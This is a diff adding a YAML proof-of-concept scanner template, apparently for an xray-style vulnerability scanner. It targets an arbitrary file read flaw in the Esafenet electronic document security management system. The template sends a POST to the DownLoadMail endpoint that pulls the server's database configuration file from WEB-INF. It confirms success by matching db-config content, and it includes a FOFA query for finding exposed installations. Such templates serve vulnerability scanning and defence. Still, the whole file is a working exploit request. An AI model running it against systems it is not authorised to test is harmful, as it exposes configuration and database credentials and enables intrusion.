@@ -1,0 +1,19 @@
+id: poc-yaml-yisaitong-esafenet-downloadmail-anyfile-read
+info:
+  name: 亿赛通电子文档安全管理系统 DownLoadMail 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 亿赛通电子文档安全管理系统
+  fofa: app="亿赛通-电子文档安全管理系统"
+requests:
+- method: POST
+  path: /CDGServer3/esafenet/DownLoadMail
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: path=/WEB-INF/classes/&name=common.cfg.xml
+  expression: "status_code == 200 && \ncontains(body,\"<?xml version\") &&\ncontains(body,\"\
+    </est-configuration>\") &&\ncontains(body,\"<db-config\") &&\ncontains(headers,\"\
+    application/x-msdownload\")\n"
+variables: {}
+transport: http
